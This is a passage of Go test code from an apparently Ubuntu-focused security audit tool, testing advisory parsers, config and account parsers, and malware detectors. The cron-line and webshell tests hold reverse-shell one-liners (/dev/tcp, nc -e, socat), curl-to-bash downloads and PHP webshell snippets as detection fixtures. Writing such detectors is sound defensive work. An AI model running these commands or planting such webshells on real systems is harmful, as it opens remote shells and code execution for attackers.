package checks

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"
	"unicode"

	"ubuntu-sys-audit/internal/model"
	"ubuntu-sys-audit/internal/procinfo"
)

const nginxPage = `<html><body><ul>
<li><p>Buffer overflow when using alias with rewrite<br>Severity: medium<br><a href="https://example/K1">Advisory</a><br><a href="https://www.cve.org/CVERecord?id=CVE-2026-15176">CVE-2026-15176</a><br>Not vulnerable: 1.31.7+, 1.30.6+<br>Vulnerable: 0.1.29-1.31.6</p></li>
<li><p>Old windows bug<br>Severity: major<br><a href="x">CVE-2010-0001</a><br>Not vulnerable: 0.8.33+<br>Vulnerable: nginx/Windows 0.7.52-0.8.32</p></li>
<li><p>Two ranges<br>Severity: high<br><a href="x">CVE-2020-0002</a><br>Not vulnerable: 1.19.3+, 1.18.1+<br>Vulnerable: 1.3.9-1.4.0, 1.18.0</p></li>
<li><p>Everything<br>Severity: low<br><a href="x">CVE-2009-0003</a><br>Vulnerable: all</p></li>
<li><p>Navigation entry, not an advisory</p></li>
</ul></body></html>`

func containsHan(s string) bool {
	return strings.ContainsFunc(s, func(r rune) bool { return unicode.Is(unicode.Han, r) })
}

func TestUITextIsEnglish(t *testing.T) {
	for _, c := range All() {
		if containsHan(c.Name) {
			t.Errorf("check %s has a non English name: %s", c.ID, c.Name)
		}
	}
	for _, sev := range model.AllSeverities {
		if containsHan(sev.Label()) {
			t.Errorf("severity label not English: %s", sev.Label())
		}
	}
	for _, cat := range model.Categories {
		if containsHan(cat.Label()) {
			t.Errorf("category label not English: %s", cat.Label())
		}
	}
}

func TestPlural(t *testing.T) {
	for _, c := range []struct {
		n    int
		noun string
		want string
	}{
		{1, "CVE", "1 CVE"},
		{0, "CVE", "0 CVEs"},
		{2, "security notice", "2 security notices"},
		{1, "nginx.org advisory", "1 nginx.org advisory"},
		{23, "nginx.org advisory", "23 nginx.org advisories"},
	} {
		if got := plural(c.n, c.noun); got != c.want {
			t.Errorf("plural(%d, %q) = %q, want %q", c.n, c.noun, got, c.want)
		}
	}
}

func TestPasswordStatusIsNotRedacted(t *testing.T) {
	// Redact masks "password=x" and "password: x". Account evidence must avoid
	// those forms, or every status would show as ***.
	line := "alice  uid=1000  shell=/bin/bash  password " + passwordLabel(ShadowEntry{Status: "locked"})
	if got := model.Redact(line); got != line {
		t.Errorf("status was masked: %q", got)
	}
}

func TestParseNginxAdvisories(t *testing.T) {
	got := parseNginxAdvisories(nginxPage)
	if len(got) != 4 {
		t.Fatalf("want 4 advisories, got %d: %+v", len(got), got)
	}
	if got[0].Title != "Buffer overflow when using alias with rewrite" || got[0].Severity != "medium" ||
		got[0].CVEs[0] != "CVE-2026-15176" || got[0].NotVulnerable != "1.31.7+, 1.30.6+" {
		t.Errorf("first entry parsed wrong: %+v", got[0])
	}
}

func TestNginxAffects(t *testing.T) {
	advs := parseNginxAdvisories(nginxPage)
	rangeAdv, windows, two, all := advs[0], advs[1], advs[2], advs[3]
	cases := []struct {
		name string
		adv  nginxAdvisory
		ver  string
		want bool
	}{
		{"inside mainline range", rangeAdv, "1.31.6", true},
		{"mainline fixed", rangeAdv, "1.31.7", false},
		{"old stable inside range", rangeAdv, "1.24.0", true},
		{"stable branch patched though numerically in range", rangeAdv, "1.30.6", false},
		{"stable branch not yet patched", rangeAdv, "1.30.5", true},
		{"below range", rangeAdv, "0.1.28", false},
		{"newer than range", rangeAdv, "1.33.0", false},
		{"windows only range ignored", windows, "0.8.0", false},
		{"single version listed", two, "1.18.0", true},
		{"second range", two, "1.4.0", true},
		{"between ranges", two, "1.10.0", false},
		{"all", all, "1.2.3", true},
		{"garbage version never matches", all, "abc", false},
	}
	for _, c := range cases {
		if got := c.adv.Affects(c.ver); got != c.want {
			t.Errorf("%s: Affects(%s) = %v, want %v", c.name, c.ver, got, c.want)
		}
	}
}

func TestAssessPHP(t *testing.T) {
	active, err := parsePHPActive([]byte(`{"8":{"8.2":{"version":"8.2.35","tags":["security"]},"8.3":{"version":"8.3.36","tags":[]}}}`))
	if err != nil {
		t.Fatal(err)
	}
	if s, rel := assessPHP("8.3.10", active); s != "behind" || rel.Version != "8.3.36" {
		t.Errorf("behind: %q %+v", s, rel)
	}
	if s, _ := assessPHP("8.3.36", active); s != "" {
		t.Errorf("current: %q", s)
	}
	if s, _ := assessPHP("7.4.33", active); s != "eol" {
		t.Errorf("eol: %q", s)
	}
	if _, err := parsePHPActive([]byte(`{}`)); err == nil {
		t.Error("empty response must fail")
	}
}

func TestParseShadowDiscardsHash(t *testing.T) {
	got := parseShadow("root:$6$salt$hashvalue:19000:0:99999:7:::\nbad::19000::::::\nlocked:!$y$j9T$x$y:19000::::::\nsvc:*:19000::::::\nold:$1$ab$cd:19000::::::\n")
	if got["root"].Status != "password" || got["root"].Algo != "sha512" || got["root"].LastChange != 19000 {
		t.Errorf("root: %+v", got["root"])
	}
	if got["bad"].Status != "empty" {
		t.Errorf("bad: %+v", got["bad"])
	}
	if got["locked"].Status != "locked" || got["svc"].Status != "locked" {
		t.Errorf("locked: %+v %+v", got["locked"], got["svc"])
	}
	if got["old"].Algo != "md5" {
		t.Errorf("old: %+v", got["old"])
	}
}

func TestIsLoginShell(t *testing.T) {
	for shell, want := range map[string]bool{
		"/bin/bash": true, "/usr/bin/zsh": true, "/usr/sbin/nologin": false, "/bin/false": false,
		"/bin/sync": false, "": true, "/usr/bin/git-shell": false, "/sbin/nologin": false,
	} {
		if got := isLoginShell(shell); got != want {
			t.Errorf("isLoginShell(%q) = %v", shell, got)
		}
	}
}

func TestMaliciousLinePatterns(t *testing.T) {
	bad := []string{
		"* * * * * root curl -fsSL http://x.example/a.sh | bash",
		"*/5 * * * * wget -q -O- http://x/y | sudo sh",
		"@reboot bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"nc -e /bin/sh 10.0.0.1 4444",
		`python3 -c 'import socket,os,pty;s=socket.socket()'`,
		"echo aGVsbG8= | base64 -d | bash",
		"socat tcp:1.2.3.4:53 exec:/bin/sh",
	}
	for _, l := range bad {
		if matchMalicious(l) == "" {
			t.Errorf("should flag: %s", l)
		}
	}
	good := []string{
		"17 * * * * root cd / && run-parts --report /etc/cron.hourly",
		"curl -fsS https://example.com/healthcheck > /dev/null",
		"0 3 * * * root /usr/bin/certbot renew --quiet",
		"curl https://example.com/x -o /opt/x.tar.gz",
		"[ -x /usr/bin/php ] && /usr/lib/php/sessionclean",
		"nc -z localhost 5432",
	}
	for _, l := range good {
		if name := matchMalicious(l); name != "" {
			t.Errorf("should not flag %q (matched %s)", l, name)
		}
	}
}

func TestReferencesTempExec(t *testing.T) {
	yes := []string{"* * * * * root /tmp/.x/run", "@reboot /dev/shm/a", "*/5 * * * * root bash /var/tmp/up.sh"}
	for _, l := range yes {
		if !referencesTempExec(l) {
			t.Errorf("should flag: %s", l)
		}
	}
	no := []string{
		"0 1 * * * root /usr/bin/backup > /tmp/backup.log 2>&1",
		"0 2 * * * root find /tmp -type f -mtime +7 -delete",
		"0 3 * * * root rm -rf /tmp/cache",
		"0 3 * * * root /usr/bin/backup",
	}
	for _, l := range no {
		if referencesTempExec(l) {
			t.Errorf("should not flag: %s", l)
		}
	}
}

func TestParseAuthorizedKey(t *testing.T) {
	line := `from="10.0.0.1",command="/usr/bin/backup --flag" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ user@host extra`
	opts, typ, blob, comment, ok := parseAuthorizedKey(line)
	if !ok || typ != "ssh-ed25519" || blob != "AAAAC3NzaC1lZDI1NTE5AAAAIJ" || comment != "user@host extra" ||
		!strings.Contains(opts, `command="/usr/bin/backup --flag"`) {
		t.Errorf("opts=%q typ=%q blob=%q comment=%q ok=%v", opts, typ, blob, comment, ok)
	}
	for _, bad := range []string{"", "# comment", "not a key"} {
		if _, _, _, _, ok := parseAuthorizedKey(bad); ok {
			t.Errorf("should reject %q", bad)
		}
	}
	if fingerprint("!!!") != "invalid key" {
		t.Error("invalid base64 should not panic or produce a fingerprint")
	}
	// Matches ssh-keygen -lf for this well known test vector shape.
	if !strings.HasPrefix(fingerprint("AAAA"), "SHA256:") {
		t.Error("fingerprint prefix")
	}
}

func TestParseFileCaps(t *testing.T) {
	// VFS_CAP_REVISION_2 with cap_setuid (bit 7) permitted.
	setuid := []byte{0, 0, 0, 2, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
	danger, any := parseFileCaps(setuid)
	if !any || len(danger) != 1 || danger[0] != "cap_setuid" {
		t.Errorf("setuid: %v %v", danger, any)
	}
	// cap_net_raw (bit 13) only, as on /usr/bin/ping.
	netRaw := []byte{1, 0, 0, 2, 0, 0x20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
	danger, any = parseFileCaps(netRaw)
	if !any || len(danger) != 0 {
		t.Errorf("net_raw: %v %v", danger, any)
	}
	if _, any := parseFileCaps([]byte{1, 2}); any {
		t.Error("short xattr must not parse")
	}
}

func TestParseMountSkips(t *testing.T) {
	mi := `22 1 8:1 / / rw,relatime - overlay overlay rw
23 22 0:5 / /proc rw - proc proc rw
24 22 0:6 / /mnt/share\040data rw - nfs4 srv:/x rw
25 22 7:0 / /snap/core/1 ro - squashfs /dev/loop0 ro
26 22 8:2 / /data rw - ext4 /dev/sda2 rw
27 22 0:30 / /var/lib/docker/overlay2/abc/merged rw - overlay overlay rw
28 22 0:31 / /dev/shm rw - tmpfs tmpfs rw
29 22 0:32 / /mnt/x rw - fuse.sshfs srv: rw
`
	got := parseMountSkips(mi)
	for _, want := range []string{"/proc", "/mnt/share data", "/snap/core/1", "/var/lib/docker/overlay2/abc/merged", "/mnt/x"} {
		if !got[want] {
			t.Errorf("%s should be skipped: %v", want, got)
		}
	}
	for _, keep := range []string{"/", "/data", "/dev/shm"} {
		if got[keep] {
			t.Errorf("%s must be scanned", keep)
		}
	}
}

func TestSSHDTokens(t *testing.T) {
	cases := []struct {
		line string
		key  string
		args []string
	}{
		{"PermitRootLogin yes", "permitrootlogin", []string{"yes"}},
		{"PermitRootLogin = yes", "permitrootlogin", []string{"yes"}},
		{"PermitRootLogin=yes", "permitrootlogin", []string{"yes"}},
		{"permitrootlogin\t\tyes", "permitrootlogin", []string{"yes"}},
		{`PermitEmptyPasswords "yes"`, "permitemptypasswords", []string{"yes"}},
		{"PasswordAuthentication no # keys only", "passwordauthentication", []string{"no"}},
		{`Include "/etc/ssh/my conf.d/*.conf"`, "include", []string{"/etc/ssh/my conf.d/*.conf"}},
		{"Match User deploy Address 10.0.0.1", "match", []string{"User", "deploy", "Address", "10.0.0.1"}},
		{"# a comment", "", nil},
		{"   ", "", nil},
	}
	for _, c := range cases {
		key, args := sshdTokens(c.line)
		if key != c.key || strings.Join(args, "|") != strings.Join(c.args, "|") {
			t.Errorf("sshdTokens(%q) = %q %v, want %q %v", c.line, key, args, c.key, c.args)
		}
	}
}

func TestSSHDConfigScoping(t *testing.T) {
	dir := t.TempDir()
	dropIn := dir + "/50-extra.conf"
	if err := os.WriteFile(dropIn, []byte("Match User deploy\n  PasswordAuthentication yes\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	main := dir + "/sshd_config"
	content := "Include " + dropIn + "\nPermitRootLogin = yes\nPermitRootLogin no\nPasswordAuthentication no\nMatch all\n  X11Forwarding yes\n  PasswordAuthentication yes\nMatch User bob\n  PermitRootLogin yes\n"
	if err := os.WriteFile(main, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := newSSHDConfig()
	cfg.parseFile(main, 0)
	if got := cfg.get("permitrootlogin", "?"); got != "yes" {
		t.Errorf("a Match in an included file must not end the main file, and the first value wins: %q", got)
	}
	if got := cfg.get("passwordauthentication", "?"); got != "yes" {
		t.Errorf("Match all applies to everyone and overrides the global value: %q", got)
	}
	if len(cfg.risky) != 2 {
		t.Errorf("conditional blocks loosening access should be recorded: %v", cfg.risky)
	}
}

func TestPasswdFieldKeepsNoHash(t *testing.T) {
	users := parsePasswd("a:x:1:1::/h:/bin/sh\nb::2:2::/h:/bin/sh\nc:*:3:3::/h:/bin/sh\nd:!:4:4::/h:/bin/sh\ne:$1$abc$def:5:5::/h:/bin/sh\n")
	want := []string{"shadow", "empty", "locked", "locked", "inline"}
	for i, u := range users {
		if u.Password != want[i] {
			t.Errorf("%s: %q, want %q", u.Name, u.Password, want[i])
		}
	}
}

func TestStockServiceShell(t *testing.T) {
	pg := map[string][]string{"postgresql-common": {"1"}}
	if !stockServiceShell(User{Name: "postgres", Shell: "/bin/bash"}, pg) {
		t.Error("postgres keeps a shell by package default")
	}
	if stockServiceShell(User{Name: "postgres", Shell: "/bin/bash"}, nil) {
		t.Error("without the package, an account named postgres is not explained")
	}
	if stockServiceShell(User{Name: "www-data", Shell: "/bin/bash"}, pg) {
		t.Error("www-data must not be exempt")
	}
}

func TestStockCapabilities(t *testing.T) {
	if !stockCapabilities("/usr/lib/snapd/snap-confine", true) {
		t.Error("packaged snap-confine ships with capabilities")
	}
	if stockCapabilities("/usr/lib/snapd/snap-confine", false) {
		t.Error("an unpackaged file at that path is not explained")
	}
	if stockCapabilities("/usr/bin/python3", true) {
		t.Error("setcap on a packaged interpreter is a backdoor")
	}
}

func TestContainerMultiCallIsNotMasquerade(t *testing.T) {
	c := NewContext(context.Background(), Options{})
	crond := procinfo.Process{InContainer: true, Exe: "/bin/busybox", Cmdline: []string{"crond", "-f"}}
	if !argv0IsAlias(c, &crond) {
		t.Error("crond under busybox in a container is normal")
	}
	crond.InContainer = false
	if argv0IsAlias(c, &crond) {
		t.Error("on the host, busybox posing as crond still needs a look")
	}
}

func TestParseUtmp(t *testing.T) {
	rec := make([]byte, utmpSize)
	rec[0] = utUserProc
	copy(rec[utOffLine:], "pts/0")
	copy(rec[utOffUser:], "alice")
	copy(rec[utOffHost:], "203.0.113.9")
	rec[utOffTime] = 1
	dead := make([]byte, utmpSize)
	dead[0] = utDeadProc
	got := parseUtmp(append(rec, dead...))
	if len(got) != 1 || got[0].User != "alice" || got[0].Line != "pts/0" || got[0].Host != "203.0.113.9" {
		t.Errorf("parsed: %+v", got)
	}
}

func TestAuthLogPatterns(t *testing.T) {
	m := authAccepted.FindStringSubmatch("Oct 31 10:00:00 h sshd[123]: Accepted publickey for root from 203.0.113.9 port 5000 ssh2: ED25519 SHA256:x")
	if m == nil || m[1] != "publickey" || m[2] != "root" || m[3] != "203.0.113.9" {
		t.Errorf("accepted: %v", m)
	}
	m = authAccepted.FindStringSubmatch("2026-10-31T10:00:00+08:00 h sshd-session[9]: Accepted password for bob from 10.0.0.5 port 1 ssh2")
	if m == nil || m[2] != "bob" {
		t.Errorf("accepted on 24.04+: %v", m)
	}
	m = authFailed.FindStringSubmatch("Oct 31 10:00:00 h sshd[1]: Failed password for invalid user admin from 198.51.100.7 port 2 ssh2")
	if m == nil || m[3] != "198.51.100.7" {
		t.Errorf("failed: %v", m)
	}
	m = authFailed.FindStringSubmatch("Oct 31 10:00:00 h sshd[1]: Invalid user test from 198.51.100.8 port 2")
	if m == nil || m[3] != "198.51.100.8" {
		t.Errorf("invalid: %v", m)
	}
}

func TestWebshellRules(t *testing.T) {
	cases := map[string]model.Severity{
		`<?php @eval($_POST['x']); ?>`:                 model.Critical,
		`<?php system($_GET["cmd"]);`:                  model.Critical,
		`<?php $_REQUEST['a']($_REQUEST['b']);`:        model.Critical,
		`<?php assert(base64_decode($_COOKIE['c']));`:  model.Critical,
		`$key="e45e329feb5d925b";`:                     model.Critical,
		`<?php eval(gzinflate(base64_decode('abc')));`: model.High,
		`<?php preg_replace("/.*/e", $x, "");`:         model.High,
	}
	for src, want := range cases {
		got, name := matchWebshell([]byte(src))
		if name == "" || got != want {
			t.Errorf("%q: got %v (%s), want %v", src, got, name, want)
		}
	}
	benign := []string{
		`<?php echo htmlspecialchars($_GET['q']); ?>`,
		`<?php $x = system_info(); evaluate($y);`,
		`<?php exec('ls -la'); // fixed command`,
		`<?php if (isset($_POST['eval'])) { save($_POST['eval']); }`,
		`<?php preg_replace('/abc/', 'd', $s);`,
	}
	for _, src := range benign {
		if _, name := matchWebshell([]byte(src)); name != "" {
			t.Errorf("false positive on %q: %s", src, name)
		}
	}
}

func TestIsPackagedAlias(t *testing.T) {
	links := map[string]string{
		"/lib/systemd/systemd-udevd": "/usr/bin/udevadm",
		"/usr/sbin/auditd":           "/usr/bin/dash",
		"/sbin/mingetty":             "/usr/bin/unrelated",
	}
	resolve := func(p string) (string, error) {
		if real, ok := links[p]; ok {
			return real, nil
		}
		return "", os.ErrNotExist
	}
	packaged := map[string]bool{
		"/lib/systemd/systemd-udevd": true, "/usr/bin/udevadm": true, "/usr/bin/dash": true,
		"/sbin/mingetty": true, "/usr/bin/unrelated": true, "/sbin/udevd": true,
	}
	owned := func(p string) bool { return packaged[p] }
	cases := []struct {
		name, argv0, exe string
		want             bool
	}{
		{"udev multi-call binary", "/lib/systemd/systemd-udevd", "/usr/bin/udevadm", true},
		{"usrmerge spelling of the same binary", "/lib/systemd/systemd-udevd", "/bin/../usr/bin/udevadm", false},
		{"symlink created by an attacker", "/usr/sbin/auditd", "/usr/bin/dash", false},
		{"packaged name pointing at another binary", "/sbin/mingetty", "/usr/bin/dash", false},
		{"BPFDoor style name with no such file", "/sbin/udevd", "/dev/shm/.udevd", false},
		{"unpackaged binary behind a packaged name", "/lib/systemd/systemd-udevd", "/dev/shm/.udevd", false},
		{"relative name", "systemd-udevd", "/usr/bin/udevadm", false},
	}
	for _, c := range cases {
		if got := isPackagedAlias(c.argv0, c.exe, resolve, owned); got != c.want {
			t.Errorf("%s: got %v, want %v", c.name, got, c.want)
		}
	}
}

func TestPathIsProcessExe(t *testing.T) {
	self, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	if !pathIsProcessExe(os.Getpid(), self) {
		t.Errorf("%s should match this process", self)
	}
	for _, path := range []string{"/proc/self/status", "/no/such/file", "relative/path"} {
		if pathIsProcessExe(os.Getpid(), path) {
			t.Errorf("%s should not match this process", path)
		}
	}
}

func TestMPTCPSockets(t *testing.T) {
	protocols := `protocol  size sockets  memory press maxhdr  slab module     cl co di ac io in de sh ss gs se re sp bi br ha uh gp em
TCP       2360     12       3   no     320   yes  kernel      y  y  y  y  y  y  y  y  y  y  y  y  y  n  y  y  y  y  y
MPTCPv6   2048      2       0   no       0   yes  kernel      y  n  y  y  y  n  n  y  y  y  y  y  n  n  n  y  y  y  n
MPTCP     1856      1       0   no       0   yes  kernel      y  n  y  y  y  n  n  y  y  y  y  y  n  n  n  y  y  y  n
`
	if got := mptcpSockets(protocols); got != 3 {
		t.Errorf("want 3 sockets, got %d", got)
	}
	if got := mptcpSockets("protocol size sockets\nTCP 2360 12\n"); got != 0 {
		t.Errorf("no MPTCP rows should count 0, got %d", got)
	}
}

func TestMPTCPFinding(t *testing.T) {
	for _, c := range []struct {
		enabled string
		sockets int
		want    model.Severity
		title   string
	}{
		{"", 0, model.OK, "not available"},
		{"0", 0, model.OK, "disabled"},
		{"1", 0, model.Medium, "recommend disabling"},
		{"1", 3, model.Medium, "review before disabling"},
	} {
		f := mptcpFinding(c.enabled, c.sockets)
		if f.Severity != c.want || !strings.Contains(f.Title, c.title) {
			t.Errorf("enabled=%q sockets=%d: got %v %q", c.enabled, c.sockets, f.Severity, f.Title)
		}
		if c.want == model.Medium && !strings.Contains(f.Remediation, "net.mptcp.enabled=0") {
			t.Errorf("enabled=%q: remediation must say how to disable it: %q", c.enabled, f.Remediation)
		}
	}
}

func TestTimeoutKeepsPartialResults(t *testing.T) {
	chk := Check{ID: "x", Name: "x", Category: model.CatWeb, Timeout: 200 * time.Millisecond, Run: func(c *Context) []model.Finding {
		<-c.Ctx.Done()
		return []model.Finding{{ID: "found", Severity: model.Critical, Title: "webshell found before the deadline"}}
	}}
	for range 20 {
		found, errText := runOne(context.Background(), NewContext(context.Background(), Options{}), chk)
		ids := map[string]bool{}
		for _, f := range found {
			ids[f.ID] = true
		}
		if !ids["found"] {
			t.Fatalf("partial finding was thrown away: %+v", found)
		}
		if !ids["x.partial"] || errText == "" {
			t.Fatalf("partial results must be marked as incomplete: %+v err=%q", found, errText)
		}
	}
}

func TestHardTimeoutStopsAStuckCheck(t *testing.T) {
	block := make(chan struct{})
	defer close(block)
	chk := Check{ID: "x", Name: "x", Category: model.CatWeb, Timeout: 100 * time.Millisecond, Run: func(*Context) []model.Finding {
		<-block
		return nil
	}}
	start := time.Now()
	found, _ := runOne(context.Background(), NewContext(context.Background(), Options{}), chk)
	if time.Since(start) > 5*time.Second {
		t.Fatal("a stuck check must not hold up the scan")
	}
	if len(found) != 1 || found[0].Severity != model.Skipped {
		t.Fatalf("a stuck check must be reported as not checked: %+v", found)
	}
}

func TestFinishedCheckIsNotMarkedPartial(t *testing.T) {
	chk := Check{ID: "x", Name: "x", Category: model.CatWeb, Timeout: time.Minute, Run: func(*Context) []model.Finding {
		return []model.Finding{{ID: "ok", Severity: model.OK}}
	}}
	found, errText := runOne(context.Background(), NewContext(context.Background(), Options{}), chk)
	if len(found) != 1 || errText != "" {
		t.Fatalf("got %+v err=%q", found, errText)
	}
}

func TestLXDBranch(t *testing.T) {
	for in, want := range map[string]string{
		"4.0.15": "4.0", "5.0.11": "5.0", "5.21.9": "5.21", "6.10.1": "6", "6.9": "6", "3.0.4": "3.0", "5.20": "5.20", "10.1": "10.1",
	} {
		if got := lxdBranch(in); got != want {
			t.Errorf("lxdBranch(%q) = %q, want %q", in, got, want)
		}
	}
	for in, want := range map[string]string{
		"5.21.9-2313ff2": "5.21.9", "6.10.1-f5c750d": "6.10.1", "3.0.4": "3.0.4", "v6.23.0": "6.23.0", "garbage": "",
	} {
		if got := lxdVersionNumber(in); got != want {
			t.Errorf("lxdVersionNumber(%q) = %q, want %q", in, got, want)
		}
	}
}

// advisory builds an advisory shaped like the real GitHub API responses.
func advisory(pkg, rng, patched string) lxdAdvisory {
	var a lxdAdvisory
	data := fmt.Sprintf(`{"ghsa_id":"GHSA-x","cve_id":"CVE-1","severity":"critical","summary":"s","vulnerabilities":[{"package":{"name":%q},"vulnerable_version_range":%q,"patched_versions":%q}]}`, pkg, rng, patched)
	if err := json.Unmarshal([]byte(data), &a); err != nil {
		panic(err)
	}
	return a
}

func TestLXDAdvisoryAffects(t *testing.T) {
	const pkg = "lxd"
	cases := []struct {
		name    string
		a       lxdAdvisory
		version string
		want    bool
		fixedIn string
	}{
		{"older on its branch", advisory(pkg, ">= 4.0", "4.0.14, 5.0.10, 5.21.8, 6.9-bf243da, 6.10"), "5.21.7", true, "5.21.8"},
		{"fixed on its branch", advisory(pkg, ">= 4.0", "4.0.14, 5.0.10, 5.21.8, 6.9-bf243da, 6.10"), "5.21.8", false, ""},
		{"newer on its branch", advisory(pkg, ">= 4.0", "4.0.14, 5.0.10, 5.21.8, 6.9-bf243da, 6.10"), "5.21.9", false, ""},
		{"lower 4.0 is compared to 4.0", advisory(pkg, ">= 4.0", "4.0.14, 5.0.10, 5.21.8"), "4.0.13", true, "4.0.14"},
		{"rolling 6 branch behind", advisory(pkg, "<= 6.9", "4.0.13, 5.0.9, 5.21.7, 6.9-ab8fad2, 6.10"), "6.8", true, "6.9"},
		{"rolling 6 branch current", advisory(pkg, ">= 4.0", "5.21.8, 6.9-bf243da, 6.10"), "6.10.1", false, ""},
		{"supported branch not listed was not affected", advisory(pkg, "> 4.0", "5.0.10, 5.21.8, 6.9-bf243da, 6.10"), "4.0.15", false, ""},
		{"supported branch not in a 6 only advisory", advisory(pkg, ">= 6.6", "6.9"), "5.21.1", false, ""},
		{"operator in the patched list", advisory(pkg, ">= 4.0.0, <= 5.0.7", "4.0.12, >= 5.0.7"), "5.0.6", true, "5.0.7"},
		{"unsupported branch inside the range", advisory(pkg, ">= 5.0", "5.0.8, 5.21.6, 6.10"), "5.20", true, ""},
		{"unsupported branch below the range", advisory(pkg, ">= 4.0", "4.0.12, 5.0.8"), "3.0.4", false, ""},
		{"Incus entry is not about LXD", advisory("github.com/lxc/incus/v6/cmd/incusd", "< v6.23.0", ">= v6.23.0"), "5.21.1", false, ""},
		{"web UI entry is not about LXD", advisory("lxd-ui", ">= 0.1", "5.21.9"), "5.21.1", false, ""},
		{"full module path counts", advisory("github.com/canonical/lxd", ">= 4.0", "5.21.8"), "5.21.1", true, "5.21.8"},
		{"empty package name counts", advisory("", ">= 4.0", "5.21.8"), "5.21.1", true, "5.21.8"},
	}
	for _, c := range cases {
		got, fixed := c.a.affects(c.version)
		if got != c.want || fixed != c.fixedIn {
			t.Errorf("%s: affects(%s) = %v %q, want %v %q", c.name, c.version, got, fixed, c.want, c.fixedIn)
		}
	}
}

func TestInLXDRange(t *testing.T) {
	for _, c := range []struct {
		rng, version string
		want         bool
	}{
		{">= 4.0.2 < 6.9", "5.0.1", true},
		{">= 4.0.2 < 6.9", "6.9", false},
		{">= 4.0.0, <= 5.0.7", "5.0.7", true},
		{"5.21.0", "5.21.0", true},
		{"5.21.0", "5.21.1", false},
		{"", "5.21.1", false},
	} {
		if got := inLXDRange(c.rng, c.version); got != c.want {
			t.Errorf("inLXDRange(%q, %q) = %v", c.rng, c.version, got)
		}
	}
}

func TestSnapYAMLVersion(t *testing.T) {
	yaml := "name: lxd\nbase: core22\nversion: 5.21.9-2313ff2\nsummary: LXD\ndescription: |-\n  version: 1.0 inside text\n"
	if got := snapYAMLVersion(yaml); got != "5.21.9-2313ff2" {
		t.Errorf("got %q", got)
	}
	if got := snapYAMLVersion("name: x\nversion: '6.10'\n"); got != "6.10" {
		t.Errorf("quoted value: %q", got)
	}
	if got := snapYAMLVersion("name: x\n"); got != "" {
		t.Errorf("no version: %q", got)
	}
}

func TestParseSnapChannels(t *testing.T) {
	data := []byte(`{"channel-map":[
		{"channel":{"architecture":"amd64","risk":"stable","track":"5.21"},"version":"5.21.9-2313ff2"},
		{"channel":{"architecture":"arm64","risk":"stable","track":"5.21"},"version":"5.21.8-aaaaaaa"},
		{"channel":{"architecture":"amd64","risk":"edge","track":"5.21"},"version":"5.21.10-bbbbbbb"},
		{"channel":{"architecture":"amd64","risk":"stable","track":"6"},"version":"6.10.1-f5c750d"}]}`)
	got, err := parseSnapChannels(data, "amd64")
	if err != nil {
		t.Fatal(err)
	}
	if got["5.21"] != "5.21.9-2313ff2" || got["6"] != "6.10.1-f5c750d" || len(got) != 2 {
		t.Errorf("%v", got)
	}
}

func TestLXDEscapes(t *testing.T) {
	yaml := `container:
  config:
    image.os: ubuntu
    security.privileged: "true"
  devices:
    root:
      path: /
      pool: default
      type: disk
    host:
      path: /mnt/host
      source: /
      type: disk
`
	got := strings.Join(lxdEscapes(yaml), ",")
	if got != "security.privileged,host root mounted" {
		t.Errorf("got %q", got)
	}
	clean := "container:\n  config:\n    security.privileged: \"false\"\n    security.nesting: \"true\"\n  devices:\n    data:\n      path: /data\n      source: /srv/data\n      type: disk\n"
	if got := lxdEscapes(clean); len(got) != 0 {
		t.Errorf("an ordinary container was flagged: %v", got)
	}
	if got := lxdEscapes("config:\n  raw.lxc: lxc.apparmor.profile=unconfined\n"); len(got) != 1 || got[0] != "raw.lxc" {
		t.Errorf("raw.lxc: %v", got)
	}
}

func TestWantVerifyCoversRustCoreutils(t *testing.T) {
	for _, path := range []string{
		"/usr/bin/ssh", "/usr/sbin/sshd", "/usr/lib/openssh/sshd-session",
		"/usr/lib/cargo/bin/coreutils/ls", "/usr/libexec/coreutils/libstdbuf.so",
		"/usr/lib/x86_64-linux-gnu/security/pam_unix.so", "/usr/lib/aarch64-linux-gnu/libkeyutils.so.1.10",
	} {
		if !wantVerify(path) {
			t.Errorf("%s must be verified", path)
		}
	}
	if wantVerify("/usr/share/doc/foo/README") {
		t.Error("documentation should not be hashed")
	}
	for _, path := range []string{"/usr/lib/cargo/bin/coreutils/ls", "/usr/bin/sudo.ws", "/usr/lib/x86_64-linux-gnu/security/pam_unix.so"} {
		if !keyBinary.MatchString(path) {
			t.Errorf("%s should rank as a key binary", path)
		}
	}
}

func TestIsUploadedPHP(t *testing.T) {
	cases := []struct {
		path string
		size int64
		want bool
	}{
		{"/var/www/html/uploads/shell.php", 5000, true},
		{"/var/www/html/wp-content/uploads/2024/03/x.php", 900, true},
		{"/var/www/html/upload/a.phtml", 900, true},
		{"/var/www/html/wp-content/uploads/index.php", 28, false},
		{"/var/www/html/wp-content/uploads/index.php", 9000, true},
		{"/var/www/html/wp-content/plugins/foo/upload/handler.php", 900, false},
		{"/var/www/html/vendor/acme/uploads/Manager.php", 900, false},
		{"/var/www/app/Http/Controllers/Upload/Store.php", 900, false},
		{"/var/www/html/images/logo.php", 900, false},
		{"/var/www/app/public/uploads/shell.php", 900, true},
		{"/var/www/admin/uploads/shell.php", 900, true},
		{"/var/www/html/index.php", 900, false},
	}
	for _, c := range cases {
		if got := isUploadedPHP(c.path, c.size); got != c.want {
			t.Errorf("isUploadedPHP(%q, %d) = %v, want %v", c.path, c.size, got, c.want)
		}
	}
}

func TestParseNginxConfig(t *testing.T) {
	conf := parseNginxTokens(`
# comment with root /nope;
user www-data;
http {
    server_tokens off;
    ssl_protocols TLSv1 TLSv1.2;
    server {
        listen 443 ssl;
        root "/var/www/my site";
        location /files { autoindex on; }
        location ~ \.php$ { fastcgi_pass unix:/run/php/php8.1-fpm.sock; }
    }
}`)
	if len(conf.Roots) != 1 || conf.Roots[0] != "/var/www/my site" {
		t.Errorf("roots: %v", conf.Roots)
	}
	if conf.ServerTokens != "off" || !conf.Autoindex {
		t.Errorf("server_tokens=%q autoindex=%v", conf.ServerTokens, conf.Autoindex)
	}
	if len(conf.WeakTLS) != 1 || conf.WeakTLS[0] != "TLSv1" {
